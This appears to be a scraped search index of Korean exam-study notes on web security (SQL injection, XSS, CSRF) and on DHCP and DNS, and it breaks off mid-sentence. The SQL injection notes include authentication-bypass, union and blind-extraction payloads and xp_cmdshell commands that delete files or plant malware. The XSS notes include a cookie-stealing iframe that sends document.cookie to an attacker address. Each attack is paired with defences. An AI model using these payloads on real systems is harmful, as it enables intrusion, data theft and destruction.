             취약점 있는지 여부 파악 방법                            ID 입력 란에 ' 나 \" 입력 후 테스트                                    Error 메시지가 출력되면 입력 값이 DB에 전달된 것 (입력검증 X) : 취약                                                                   예시                            PHP 코드 (로그인처리)                                    취약한 코드 예시                       $query = select id, pw from member where id='$id' and pw='$pw';   $result = mysql_query($query, $connect);   $num_rows = mysql_num_rows($result);   if($num_rows) {       $row = mysql_fetch_array($result);       $id = $row[id];       echo \"로그인 성공\";   } else {       echo \"로그인 실패\";   }                                                           사용자가 입력한 값을 그대로 변수에 담아옴                   변수에 ' or 1=1 # 입력할 경우                                            ID : ' or 1=1 #                       pW : test                           select id, pw from member where id='' or 1=1#and pw='test';                                                                                                           URI 인코딩 메시지 (HTTP 요청메시지)                                            id=' or 1=1#                       id=%27+or+1%3d1%23                                                                                                           대응책                            PHP 설정파일 : php.ini                                    magic_quotes_gpc=on : GET, POST, Cookie 로 전달되는 데이터에 '(Single quote), \"(Double quote), \\(Back slash), ``(Null)(0x00) 특수문자를 일반문자로 처리 (Escape 처리)                   5.4 버전 이상에서는 설정값이 없고, mysql_real_escape_string() 함수 (MySQL 라이브러리 함수) 를 이용                           $id = mysql_real_escape_string($id)       $pw = mysql_real_escape_string($pw)       $query = select id, pw from member where id='$id' and pw='$pw';                                                                 결과 : select id, pw from member where id='\\' or 1=1#'                                                                                       Prepared Statement (선처리 질의문)                                    동적으로 쿼리를 생성하지 않음                   사용자의 입력값을 바인딩 처리                           $stmt=$conn-&gt;prepare(\"select id, pw from member where id=? and pw=?\");       $stmt-&gt;bind_param($id, $pw);       $stmt-&gt;execute();                                                           입력값을 제외하고 사전 컴파일 처리                   입력값은 명령어가 아닌 입력값으로만 처리                                               파라미터 필터링을 이용한 SQL Injection 방지                                    블랙리스트 생성                           function chk_blacklist($str){           $returnVal = false;           $blist = array('\\'','\\\"','#','--','union','selector','update','or','and','insert','update')            ###for 문 체크               if 포함 $returnVal = true; break;           ###            return $returnVal;       }        $chk_id = chk_blacklist($id);       $chk_pw = chk_blacklist($pw);       if (chk_id || chk_pw){           ...       }                                                                                                                       Union SQL Injection                    Union 명령어                   select id, pw from member where id='test';       select id, pw from member where id='test' union select 'test', '1212'; -- 결과값이 같을 경우 하나로 표기       select id, pw from member where id='test' union all select 'test', '1212'; -- 결과값이 같을 경우 중복 표기       select id, pw from member where id='' union select 'test','1234';                                         조건 : Union 은 필드의 개수가 똑같아야 결합 가능                                   컬럼을 파악할 때 사용하는 명령   select * from member where id='' order by 4#;                            Error code : Unknown column ‘4’ in ‘order clause’ (필드가 3개라 판단)                                   공격방식                            id 부분에 ' union select 'test', '1234'# 입력                                    오류없이 인증 우회 가능                                                                   예시 : 값 비교를 통한 form SQL Injection 방어 코드                   $query = \"select id, pw from member where id=$id\";       $result = mysql_query($query, $conn);       $num_rows = mysql_num_rows($result);       if($num_rows) {           $row = mysql_fetch_array($result);           $id = $row[id];           $rec_pw = $row[pw]; // 첫번째 레코드의 pw 값을 저장           if($pw != $rec_pw) {echo \"로그인실패\"} else {echo \"로그인성공\"}       }                                         Union SQL Injection 에 취약                                    id : ' union' select 'test', 'test' #                   pw : test                                                                               Stored Procedure SQL Injection                    저장 프로시저는 여러 쿼리문을 하나의 함수처럼 실행하여 사용하는 쿼리의 집합을 의미           특정 작업을 일괄 처리하기 위한 용도로 사용           명령어                   exec master..xp_cmdshell 'dir c:\\'       exec master..xp_cmdshell 'del c:\\ /q/s'                                         exec master.dbo.xp_cmdshell '시스템명령어'               확장형 저장프로시저                                    xp_cmdshell                                            관리자의 권한으로 임의의 명령을 수행                                                           xp_regwrite                                            레지스트리 작성                                                           exec master.dbo.xp_dirtree 'c:\\'                                            디렉토리 구조                                                           공격예시                                            aaa.php?tt=1234;exec master.dbo.xp_cmdshell 'ping 192.168.10.0'                                                    뒤의 명령도 실행됨.                                                                       aaa.php?tt=1234;exec xp_regwrite 'HKEY_LOCAL_MACHINE','\\software\\microsoft\\window...','winhelp',REG_SZ,'c:\\temp\\hac.exe'                                                    레지스트리 키 작성, 윈도우 도움말을 볼 때 악성코드 실행                           c:\\temp\\hac.exe : 공격자가 심어놓은 악성코드                                                                                                                                                                       Mass SQL Injection                    기존의 SQL-Injection 기법보다 확장된 개념           보안장비와 필터링 설정을 우회하는 기법 (2가지 방법)                            공격쿼리의 일부분을 HEX 인코딩               전체 쿼리를 HEX 인코딩                                   대량의 DB값이 변조되어 홈페이지에 치명적인 악영향           DB값 변조시 악성 스크립트를 삽입                            사용자들이 변조된 사이트를 방문시 감염               BOT이 설치되어 계정 해킹이나 DDOS 공격에 이용                                   대상                            공격대상이 MS-SQL 을 사용               ASP 가 가동중인 IIS 웹서버                                   특징                            데이터베이스에 악성코드를 대량으로 삽입               자동 삽입 스크립트를 사용하여 한번에 악성코드를 대량 삽입               POST 나 HTTP Header (쿠키, 리퍼러) 를 이용한 경우 공격 로그를 찾기 어려움               악성코드 삽입 과정에서 데이터의 손실 발생               &lt;script src=...&gt;&lt;/script&gt; 태그를 삽입, js, swf, exe 파일               HEX 코드로 인코딩 변환                                    대상 코드                           begin           exec ('update' + @t + ' set' + @c + \" = \" &lt;script&gt; document.location = \"http://www.xxx.com\"&lt;/script&gt;'\")       end                                                           FW 등의 필터링을 우회                                                                   대응방법                            declare 구문을 이용한 공격방식 차단                                    위해 웹 소스상의 쿼리스트링 길이 제한                   소스코드 수정 (중-장기 대응방안)                   입력문자의 필터링                   DB, System 정기 백업                                                                                   공격유형에 따른 분류            에러 기반 SQL Injection                    개요                            DB 쿼리 결과의 에러값을 이용하여 원하는 정보를 점진적으로 얻어나감               DB 에러가 외부로 노출되는 취약점을 이용한 공격               Error 메시지를 노출하지 않으면 사용할 수 없음                                   예시                            테이블명 및 필드명 획득                                    having 이용                                            검색 창이 있을 시                                                    select * from member ...                                                                        group by 절이 컬럼을 기준으로 그룹을 만들 때 having 은 결과를 한번 더 필터링                       ` having 1=1 –`                       오류메시지 : member.idx 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’                                                    member : 테이블명                           idx : 필드명                                                                       group by idx --                       오류메시지 : member.bId 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’                       group by idx, bid -- …                                                                                       컬럼(필드) 타입 획득                                    sum() 이용 : 숫자형인지 여부                   union 이용                                            union select sum(컬럼명) from member --                       오류메시지 : 숫자타입의 필드(컬럼) -&gt; 동일 개수의 식이 있어야 합니다.                       오류메시지 : VARCHAR 타입의 필드(컬럼) -&gt; sum or avarage 연산에서는 varchar 타입 데이터 형식을 인수로 사용할 수 없습니다.                                                           필드의 개수를 알고 있을 때 필드의 타입을 획득하는 방법                                            union select 에 NULL 을 활용                       union select NULL,NULL,NULL,NULL from member                       union select 1,NULL,NULL,NULL from member                                                    에러가 없으면 첫번째 컬럼은 Int 형                                                                                                           필드의 개수가 파악되면 ID, PW 를 받아올 수 있음                                            union select idx, name, password, ...                                                                                                                       Blind SQL Injection                    개요                            쿼리의 결과가 참인지 거짓인지의 반응으로 취약점 발견               Limit 연산, substr(문자열 자르기), ASCII(아스키 코드 반환) 등 함수를 이용               정보를 수집하고 필드값이나 테이블 명을 추측하여 공격                                   예시                            쿼리부분 예 (PHP)                       $query = \"select * from bbs       where $find like '%$search%\"       order by idx desc\";                                                     설명                                            $search : 사용자가 입력한 검색어                       $find : 제목, 내용, 작성자, 내용+제목 등                                                           검색어에 ' and 1=1# 입력 시                                            where $find like '%' and 1=1#%                                                    $find like '%' : True                           1=1 : True                                                                                                           검색어에 ' and 1=2# 입력 시                                            where $find like '%' and 1=1#%                                                    $find like '%' : True                           1=2 : False                                                                                                           True 와 False 에 대한 결과로 BlindSQL Injection 가능여부를 판단                                               스키마                                    Information_schema : DB의 구조, 제약조건 등 메타 데이터를 제공                   Information_schema.tables : 모든 테이블에 대한 정보                   Information_shcema.columns : 모든 테이블의 컬럼정보                                               함수                                    limit : 출력 레코드의 개수를 제한하는 함수 (ex:limit pos,len)                   substr : 문자열을 추출하는 함수 (ex:substr(문자열, pos, len))                                            pos : 시작위치 / len : 문자개수                           select table_schema, table_name, table_type from information_schema.tables   where table_type = 'base table' -- 사용자가 만든 테이블   limit 0,1 ;                                                                       사용자가 만든 테이블을 처음부터 1개 가져오기                           select substr((select table_name from information_shcema.tables where table_type = 'base table' limit 0, 1), 1, 1) from dual;                                                                       사용자가 만든 테이블명을 처음부터 1개 가져와서 앞자리 확인                           select column_name from information_schema.columns   where table_name = 'employee'    limit 0, 1;                                                                       테이블명이 ‘employee’ 인 컬럼명을 처음부터 1개 가져오기                                                                                       활용법                                    검색창에 입력                                            ' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#                                                           완성 쿼리 내용                           select * from bbs where subhect like '%       ' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#%'                                                                 검색 결과값이 나오면 참, 결과값이 없으면 거짓                       자동화된 툴을 이용해서 테이블 정보를 파악                                                                                                           과정                            Table 정보 -&gt; 필드(Column) 정보 -&gt; Data 획득                                    information_schema.tables, information_schema.columns, union select 이용                                               테이블명 획득                                    ' and substr((select table_name ...),1,1)='a'#                   %27+and+substr%28%28select+table_name...                                            POST 의 Message Body 영역에 URIEncoding 방식으로 변경되어 전송됨                                                                                       컬럼정보 획득 (획득한 테이블 정보 employee)                                    ' and substr((select column_name from information_schema.columns where tablew_name='employee' limit 0,1),1,1)='a'#                                               Data 획득 (획득한 컬럼정보 이용)                                    ' and 1=2 union select 'a','b','c','d','e','f','g','h','i'#                       select * from bbs where subject like '%' and 1=2 union select 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i'#%'                                                                 1=2 를 통해 원 검색결과 출력을 막음                       필드개수 9개 : bbs의 필드개수와 동일하게 설정                       출력 결과를 통해 웹사이트의 필드가 어떤 컬럼과 매핑되는지 확인                                                           출력위치 확인 후 해당 위치로 employee 테이블의 조회결과 출력                   ' and 1=2 union select null,null,null,concat(name, '/', juminNo), null, null, null, null, null from employee#                       select * from bbs where subject like '%' and 1=2 union select null, null, null, concat(name, '/', juminNo), null, null, null, null, null from employee#%'                                                                                                                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-SQL_Injection/",
        "teaser": null
      },{
        "title": "정보보안 - XSS(Cross Site Script)",
        "excerpt":"XSS(Cross Site Script)      개요            SQL Injection : 입력값 필터링이 되지 않아 발생       XSS (Cross Site Script) : 입력값 필터링이 되지 않아 발생       Form 입력 양식에 악의적인 스크립트를 작성하여 입력 혹은 URL 입력창에 스크립트를 작성하여 입력                    웹서버에 입력           Javascript, ActiveX, VBscript, Flash파일 (swf) 등 삽입                       공격자에게 개인정보, 쿠키정보 등을 전송, 피해자 PC에 악성코드 설치       다운로드 받은 html 문서 안에 javascript 등의 악성 스크립트가 포함       브라우저에서 자동 실행됨       Client 가 희생자가 됨           과정            공격자가 XSS 를 서버에 삽입 (XSS 취약점이 존재하는 서버)       희생자(클라이언트)가 서버의 XSS 에 접근       희생자가 서버의 XSS 스크립트가 포함된 문서를 다운로드       희생자의 PC에서 스크립트가 실행됨       악성코드가 설치되거나 정보가 공격자에게 전달됨           방식            Stored XSS (저장형 XSS)                    개요                            가장 일반적인 형태의 XSS               공격자가 게시판, 자료실 등에 스크립트를 입력하여 저장 (DB 저장)               희생자가 게시물을 열람하는 순간 악성 스크립트가 클라이언트에서 실행됨               서버 취약점 점검이 필요                                   공격방식                            주로 &lt;iframe&gt; 태그를 이용함                                    최근에는 &lt;iframe&gt; 태그를 사용자제                   &lt;iframe width=0 height=0 src=\"javascript:document.location.href='http://192.168.10.1/abc/a.php?cookie=document.cookie'\"&gt;&lt;/iframe&gt;                                            공격자의 주소로 cookie 값을 전송                           $content = \"&lt;iframe width=0 height=0 src=\"javascript:document.location.href='http://192.168.10.1/abc/a.php?cookie=document.cookie'\"&gt;&lt;/iframe&gt;\";   $query = \"insert into $bbs(id, name, subject, content)   values ('$id', '$name', '$subject', '$content')\";                                                                                                                                                           대응방법                            XSS 공격은 HTML, 스크립트 태그를 사용               HTML 특수문자                                    htmlspecialchars() 함수 이용 (PHP)                                            $content = htmlspecialchars($content,ENT_QUOTES);                                                    ENT_QUOTES : ', \" 모두 변환                           사용하지 않을 경우 : \" 만 변환                                                                       함수 사용시 태그 내용이 그대로 출력됨                       HTML 특수문자를 escape 처리하여 일반문자 (HTML Entity) 로 치환                                                    &lt; : &amp;lt;                           &gt; : &amp;gt;                           &amp; : &amp;amp;                           \" : &amp;quot;                           ' : &amp;#039; : &amp;#x27; (16진수)                           ( : &amp;#40; : &amp;#x28; (16진수)                           ) : &amp;#41; : &amp;#x29; (16진수)                           # : &amp;#x23; (16진수)                           / : &amp;#x2F; (16진수)                           소스보기 시 일반문자로 보이게 됨 (&amp;lt; 등)                                                                                                           strip_tags() 이용                                            스크립트 태그를 제거                                                                                                                       Reflected XSS (반사형 XSS)                    개요                            악성스크립트를 서버 DB에 저장하지 않음               악성스크립트를 직접 클릭하도록 유도                                    공격자가 악성스크립트 링크를 포함한 메일 전송                   희생자는 메일 링크 클릭                                            url.php?q=스크립트 : 희생자가 알아볼 수 없도록 처리                                                           희생자가 링크를 클릭하여 웹서버에 요청                   서버는 스크립트의 내용을 처리하지 않고 그대로 응답 (서버 처리 스크립트 X)                                            일반적으로 서버에 검색내용을 입력                                                    입력값 예 : www.test.com/search/?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;                           검색 결과 있는 경우                                                            결과값을 사용자에게 전달                                                                                   검색 결과 없는 경우                                                            사용자 입력값을 그대로 HTML 에 포함하여 응답                               요청값을 서버에서 반사시킴                               응답 예 :                                   &lt;h2&gt;&lt;span class=''&gt;Search Result&lt;/span&gt;&lt;br/&gt;   Search:&lt;script&gt;alert(document.cookie)&lt;/script&gt;   &lt;/body&gt;\"                                                                                                                                                                                                                                   희생자는 공격자에게 자신의 정보 전달                                            응답페이지가 희생자에게 전달되면서 스크립트 실행                                                                                                           공격방식                            공격자는 XSS 취약점이 있는 사이트를 발견               중요 정보를 획득할 수 있는 공격용 악성 URL을 생성               이 URL을 이메일을 이용하여 배포               희생자가 URL을 클릭시 악성스크립트가 희생자에 반사되어 공격을 당하게 됨                                   대응방법                            XSS 취약점이 있는 사이트에서 특수문자를 일반문자 (HTML Entity) 로 치환                                               DOM based XSS                    개요                            DOM (Document Object Model) : HTML/XML 문서 (계층구조)                                    W3C 에서 정의                   HTML/XML 문서의 접근방법을 표준으로 정의하는 모델                                               HTML                       &lt;html&gt;           &lt;head&gt;               &lt;title&gt;&lt;/title&gt;           &lt;/head&gt;           &lt;body&gt;               &lt;h2&gt;&lt;/h2&gt;           &lt;/body&gt;       &lt;/html&gt;                                               XML                       &lt;book&gt;           &lt;subject&gt;&lt;/subject&gt;           &lt;writer&gt;&lt;/writer&gt;       &lt;/book&gt;                                               DOM based XSS                                    Stored XSS, Reflected XSS 와 달리 서버의 응답과 관계없음                   피해자의 브라우저에서 발생                   피해자의 브라우저가 DOM 구문분석을 할 때 악성스크립트 실행                   Javascript 가 DOM 내용을 변화시킴                                                                   공격방식                            공격자가 희생자에게 메일링크(악성스크립트 포함)가 포함된 메일을 보냄               희생자가 링크를 클릭하면 웹서버에 요청               웹서버가 응답 (악성스크립트 미포함)               희생자의 요청에 포함된 URL 악성스크립트가 그대로 남아있음               URL 쿼리스트링의 파라미터를 응답페이지에 있는 DOM을 이용해서 동적으로 악성스크립트를 실행                       &lt;HTML&gt;           &lt;HEAD&gt;&lt;TITLE&gt;Welcome&lt;/TITLE&gt;&lt;/HEAD&gt;           &lt;script&gt;               var pos = document.URL.indexOf(\"name=\")+5;               document.write(document.URL.substring(pos,document.URL.length))               /*               http://www.abc.com/page.php?name=kim               http://www.abc.com/page.php?name=&lt;script&gt;alert()&lt;/script&gt;               */           &lt;/script&gt;           &lt;body&gt;               안녕하세요               아래페이지를 참고하세요               링크페이지 &lt;!-- 악성코드 url --&gt;           &lt;/body&gt;       &lt;/HTML&gt;                                                     이메일 링크 등에 악성스크립트를 포함한 url 전송                   url 클릭 시 document.write 함수가 있는 서버로 연결                   클라이언트 브라우저에서 DOM 에 악성코드를 추가                   브라우저에서 악성스크립트 실행                                                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-XSS/",
        "teaser": null
      },{
        "title": "정보보안 - CSRF(Cross Site Request Forgery)",
        "excerpt":"CSRF (Cross Site Request Forgery)     개요            사용자의 브라우저에서 해당 사용자의 권한으로 어떤 기능을 수행하도록 만드는것       XSS의 취약점이 존재할 시 CSRF의 취약점이 존재할 수 있는 확률이 90% 이상임       공격자가 의도한대로 수정, 삭제, 등록하도록 하는 방법       XSS 는 사용자의 PC에서 공격이 이루어지나 CSRF는 정상적인 사용자가 서버에 공격자가 의도한 요청을 하도록 만드는 것           과정            공격자가 웹서버 (CSRF 취약점 존재 - 정상/비정상 요청을 구분하지 못함) 에 조작된 요청 (비밀번호 수정 등) 을 담은 게시물을 등록       웹서버는 게시물을 등록       희생자는 조작된 게시물을 열람       웹서버는 희생자의 권한으로 조작된 요청 (비밀번호 수정 등) 을 처리                    희생자의 비밀번호가 공격자가 입력한 비밀번호로 수정됨                       웹서버가 희생자에게 응답메시지(페이지) 전송       (사용자가 로그인한 상태에서 접속가능한 웹페이지나 동작가능한 스크립트를 공격대상으로 함 - modify.asp, modify.php … )       (IMG, EMBED 태그, javascript 등이 공격대상이 됨)           CSRF 의 공격 예            자동으로 게시판 글 추가/삭제       자동으로 댓글 달기       자동으로 친구 등록       강제로 회원 탈퇴       자동으로 게시판 조회수 조작       자동으로 회원정보 변경       강제 Browsing 을 유도하는 공격                    &lt;iframe width=0 height=0 src=http://광고페이지&gt;           &lt;img src=http://광고페이지&gt;                       인증된 사용자 공격                    희생자의 계좌에서 공격자의 계좌로 입금           ID/PW 필요없이 가능한 공격                            대다수의 사이트는 한번 로그인을 하면 세션쿠키로 인증관리를 한다.               XSS : 세션쿠키를 가로채서 공격자가 정상적인 사용자로 위장가능               CSRF : 세션쿠키를 가로챌 필요 없이 CSRF 요청페이지를 수행하기만 하면 됨                                                   대응책            정상적인 요청과 비정상적인 요청을 판별할 수 있게 함 (토큰 사용)                    예측이 어려운 토큰을 사용           사용자가 요청한 내용이 위조되었는지 여부를 판별하기 위함           세션정보의 토큰 값과 요청내용 내 토큰 값이 같은지 비교                       XSS, CSRF 의 취약점 제거       입력화면 폼 작성시 GET 보다 POST 사용           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-CSRF/",
        "teaser": null
      },{
        "title": "정보보안 - DHCP(Dynamic Host Configuration Protocol)",
        "excerpt":"DHCP (Dynamic Host Configuration Protocol)     네트워크 통신            TCP/IP 기반 네트워크 노드 (컴퓨터, host) 는 자신의 IP를 알아야 함                    IPv4 클래스 : A, B, C, D           Classless 주소체계 : 서브넷 마스크 필요                       외부네트워크와 통신하기 위해 디폴트 라우터 주소나 이름과 네임서버 주소를 알고 있어야 함       네트워크에 접속한 모든 컴퓨터가 알아야 할 정보                    자신의 IP 주소           라우터 IP 주소           네임서버 IP 주소           서브넷 마스크                           네트워크 역사            RARP =&gt; BOOTP (Bootstrap) =&gt; DHCP (동적 호스트 설정 프로토콜)       RARP (Reverse Address Resolution Protocol)                    자신의 IP를 모를 때 이용           인터넷 초창기에 부팅된 컴퓨터의 IP주소 제공           물리주소 (Mac Address) 를 IP 주소로 변환           ARP : IP 주소를 물리주소 (Mac Address) 로 바꿔주는 역할           현재 사용하지 않음                            IP 주소만을 제공 (라우터, 네임서버 IP나 서브넷 마스크를 모름)               ARP 서버가 각 네트워크 망에 존재해야 함                                               BOOTP (Bootstrap)                    RARP의 2가지 단점을 보완한 클라이언트/서버 형태의 프로토콜           인터넷 상에 BOOTP 서버 존재                            4가지 정보 항목 (자신, 라우터, 네임서버 IP, 서브넷 마스크) 모두 제공               정적 설정 프로토콜                                   포트번호 67 (Server), 68 (Client) 사용 =&gt; DHCP 로 사용 가능                       DHCP (Dynamic Host Configuration Protocol)                    UDP 기반 프로토콜           서버가 네트워크 클라이언트에게 IP주소를 실시간으로 부여           IP 주소가 수동으로 설정되는 정적 IP주소와는 다르게, 사용 가능한 IP주소를 자동으로 확인           클라이언트/서버 형태의 응용계층 프로토콜           처음 부팅된 컴퓨터나 디스크가 없는 컴퓨터에게 4개의 정보를 제공                           장점            네트워크 설계 변경 / 구성 변경이 쉬움                    DHCP 서버에서 변경                       IP 절약       관리 용이 (TCP/IP 설정을 따로 할 필요없음)           단점            IP 없는 클라이언트 부팅 시 네트워크 상의 DHCP 서버에 IP 요청 브로드캐스트                    네트워크 성능 저하                       전원이 켜져있는 호스트에게 IP 할당                    IP 낭비                       IP 임대기간동안 다른 단말기에 해당 IP가 할당되지 않음                    IP 낭비                       호스트가 너무 많은 경우 서버 과부하가 발생           DHCP 동작과정            Client -&gt; Server                    Client 자신의 IP를 모르는 상태           Server : 192.168.172.10 으로 가정           DHCPDISCOVER 메시지 전송 (UDP)                            Client IP : 0.0.0.0               전송지 : 255.255.255.255                                               Client &lt;- Server                    DHCPOFFER 메시지 전송                            여러 개의 IP 주소를 제안                                               Client -&gt; Server                    Client 는 IP 주소를 선택           DHCPREQUEST                       Client &lt;- Server                    DHCPACK                       IP 주소가 마음에 안 들 경우 반복           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-DHCP/",
        "teaser": null
      },{
        "title": "정보보안 - DNS(Domain Name System)",
        "excerpt":"DNS (Domain Name System)     개요            DNS 는 프로토콜이라기 보다는 인터넷 네임체계를 규정하는 거대한 시스템                    www.google.com : 사람은 문자형태로 입력           192.168.0.1 : 컴퓨터가 알아볼 수 있는 형태           DNS : 사람과 컴퓨터가 알아볼 수 있는 형태로 변환해주는 체계                           과정            User -&gt; DNS    Client PC    WebServer                    User : 네임 입력                       User    DNS -&gt; Client PC    WebServer                    DNS 역할           DNS : 네임 요청처리           DNS : 주소 변환                       User    DNS    Client PC -&gt; WebServer                    Client PC : 자원요청           WebServer : 요청처리                       User    DNS    Client PC &lt;- WebServer                    WebServer : 응답생성           Client PC : 응답처리           User : 자원접근                           기능            네임 공간 정의 (네임구조)                    계층구조 예시 : www.google.com (계층구조)                            com : 최상위 도메인 (TLDs) 공간                                    google : 2단계 도메인                                                                   루트서버 (전 세계 13개정도가 있음)                            도메인에 대한 정보를 가지고 있지 않음               자신의 권한을 다른 서버들에게 위임, 서버만 참조               .com : TLDs                                    .google : 2단계 도메인                   .naver : 2단계 도메인                                            blog : 하위도메인                       cafe : 하위도메인                       mail : 하위도메인                                                                                       .edu : TLDs                                    .skku : 2단계 도메인                                               .net : TLDs                                    .daum : 2단계 도메인                                                                   DNS 서버                            도메인을 담당하는 호스트               저장되는 데이터                                    자원 레코드 (Resource Record, RR)                                            www.google.com = 192.168.xx.xx                                                           마스터 파일 (Zone 파일)                                            도메인에 대한 정보를 가지고 있음                       RR(복수개) 들을 관리                       RR의 추가, 변경, 삭제                                                    music.google.com = 192.168.xx.xx                                                                                                                                                           Zone : 도메인을 관리하는 단위 (영역)                            DNS 서버(네임서버) 하나가 책임이나 권한을 가지는 영역               도메인은 위임을 통해 관리가 가능한 단위로 분할 가능                                   자원 레코드 (Resource Record, RR)                            DNS 서버는 모든 데이터를 RR로 정의해서 저장                                    네임 (0~32)                                            도메인 혹은 Zone Name                                                                                                                                                           유형(Type) (0~16)                           클래스 (16~32)                                                                                                                 유형(Type)                                                                                                                                                                                    유형값                                   문자코드                                   RR유형                                                                                                                                                                                                                                                                                   1                                   A                                   주소 (IPv4)                                                                                                                                                                                                                                                                                   28                                   AAAA                                   주소 (IPv6)                                                                                                                                                                                                                                                                                   2                                   NS                                   네임서버 (이름)                                                                                                                                                                                                                                                                                   5                                   CNAME                                   정규네임 (Canonical)                                                                                                                                                                                                                                                                                   6                                   SoA                                   권한개시정보 (DNS Zone 정보)                                                                                                                                                         모든 Zone 은 하나의 SoA 레코드를 가지고 있음                                                                                                                                                                                                                   12                                   PTR                                   포인터 (다른 위치를 가리킴, 역방향 변환 이용)                                                                                                                                                                                                                                                                                   15                                   MX                                   메일 교환 (도메인으로 들어오는 이메일 처리를 위한 장비 이름 명시)                                                                                                                                                                                                                                                                                   16                                   TXT                                   문자열                                                                                                                                                                                               클래스                                                                                                                                                                                    1                                   IN (Internet, 가장많이 사용)                                                                                                                                                                                                                                                                                   2                                   Unassigned (할당되지 않음)                                                                                                                                                                                                                                                                                   3                                   CH (Chaos)                                                                                                                                                                                                                                                                                   4                                   HS (Hesiod)                                                                                                                                                                                                                                   유지시간 (0~32)                                            레코드를 읽은 장비가 캐시에 얼마동안 정보를 유지해야 하는지 명시                                                           데이터 길이 (0~32)                                            자원에 대한 데이터 크기                                                           데이터 (0~32)                                            실제 데이터                           이름 : www.google.com   유형 : 1   TTL (Time To Live) :   Size :   호스트 : 192.168.170.10   ...                                                                                                                                                           DNS 서버                            Master               Slave                                   DNS 메시지 구조                            사용자가 DNS 서버에 질의했을 때 받는 메시지                                    Header (12 Bytes)                                            메시지 유형 설명                                                           Question (가변)                                            질의 정보                                                           Answer (가변)                                            질문에 대한 답변 RR                                                           Authority (가변)                                            권한 네임서버를 가리키는 하나 이상의 RR 포함                                                           Additional (가변)                                            질의와 관련된 부가정보를 나타내는 하나 이상의 RR                                                                                                                       네임 등록                    IP 주소 (예:192.168.0.10) 에 웹서버를 구축한 경우                            이름 www.abc.com 으로 접근시키기 위해서 네임 등록               abc.com 도메인 공간 안에서는 마음대로 등록 가능                                    cafe.abc.com                   blog.abc.com                   …                                                                               네임 변환                    사용자가 www.abc.com 으로 접근했을 경우                            IP 주소 192.168.0.10 으로 변환시켜줌                                   DNS 네임 변환 과정                            DNS =&gt; Client / Server 가 존재                                    주소 =&gt; 이름                   이름 =&gt; 주소                   Resolver (변환기) : 네임서버에 질의를 수행하는 SW / 모듈                                               반복적 해석 (변환) : Iterative Query                                    Authoritative 서버에 질의할 경우                   User -&gt; 루트 NS    .Com 담당 NS    google 담당 NS                                            google.com 변환 요청                                                           User &lt;- 루트 NS    .Com 담당 NS    google 담당 NS                                            com 담당 네임서버 주소                                                           User        -&gt;     .Com 담당 NS    google 담당 NS                                            google.com 변환 요청                                                           User        &lt;-     .Com 담당 NS    google 담당 NS                                            google.com 담당 NS 주소                                                           User                     -&gt;         google 담당 NS                                            google.com 변환 요청                                                           User                     &lt;-         google 담당 NS                                            google.com IP 주소                                                                                       재귀적 해석 (변환) : Recursive Query                                    Recursive 서버에 질의할 경우                   중간 과정의 네임서버들이 모두 재귀적 변환을 허용해야 함                                            실제로는 그렇지 않음.                                                           User -&gt; 루트 NS    .Com 담당 NS    google 담당 NS                                            google.com 변환 요청                                                           User    루트 NS -&gt; .Com 담당 NS    google 담당 NS                                            google.com 변환 요청                                                           User    루트 NS    .Com 담당 NS -&gt; google 담당 NS                                            google.com 변환 요청                                                           User    루트 NS    .Com 담당 NS &lt;- google 담당 NS                                            google.com IP 주소                                                           User    루트 NS &lt;- .Com 담당 NS    google 담당 NS                                            google.com IP 주소                                                           User &lt;- 루트 NS    .Com 담당 NS    google 담당 NS                                            google.com IP 주소                                                                                       일반적인 DNS 네임 변환 과정                                    반복적(Iterative) 변환과 재귀적(Recursive) 변환을 함께 사용함                   DNS 서버의 종류                                            Recursive DNS Server : 조건이 만족될 때까지 반복적으로 처리                       Authoritative DNS Server (권한서버)                                                    Root Server, .Com NS, google NS 등 특정 도메인 영역 (Zone) 과 권한을 가지고 있는 서버                                                                       Cache : 캐시에 저장된 정보를 제공                       ISP 업체 (KT, SKT … ) 가 제공하는 서버                                                           Recursive Query 순서                                                                                                DNS Cache 검색                                                            자신에게 도메인 정보가 없을 시 DB를 검색하거나 타 서버에 요청해야 하나 시간이 오래 걸림                                                                                         캐시로 저장                                                                    속도는 빠르나 잘못된 정보를 매핑할 수 있음                                                                                               양성 캐싱(positive caching) : 한 번 질의 된 도메인 네임과 해당 IP 주소를 캐시에 유지하여 같은 질의가 올 때 캐시에서 응답해 주는 것                               음성 캐싱(negative caching) : 잘못된 도메인에 관한 요청을 캐싱하여 불필요한 트래픽과 지연을 줄이는 역할                                                                                                                                                                                   hosts 파일 검색                                                            host 명 : IP 주소 정보를 담고 있는 파일                               /etc/hosts (리눅스) / hosts.ics (Internet Connection Sharing 기능 - 윈도우)                                                                                         파밍사이트 접속유도를 위해 공격자가 목표로 하는 파일                               변조 위험성이 큼                                                                                                                                                                                   DNS 서버 질의                                                            Recursive DNS Server                               Authoritative DNS Server                                                                                                                                                                   일반적인 과정                                            재귀적 질의                                                    사용자가 브라우저에 URL 입력 : comps.googleex.edu                                                            Resolver : 사용자 DNS 클라이언트 소프트웨어                                                                                   PC 내 Resolver 가 PC 내 Cache 확인                           Resolver 가 로컬네임서버에 (Recursive DNS Server) 재귀적 질의                           로컬네임서버가 Cache 확인                                                                       반복적 질의                                                    로컬네임서버가 루트서버에 질의                           루트서버가 .edu 네임서버 주소를 전달                           로컬네임서버가 .edu 네임서버에 질의                           .edu 네임서버가 .googleex 네임서버 주소를 전달                           로컬네임서버가 .googleex 네임서버에 질의                           .googleex 네임서버가 comps.googleex.edu 네임서버 주소를 전달                           로컬네임서버가 comps.googleex.edu 네임서버에 질의                           comps.googleex.edu IP 주소를 전달                                                                       재귀적 질의                                                    로컬네임서버가 Cache 갱신                           로컬네임서버가 Resolver 에게 IP 전달                           Resolver 가 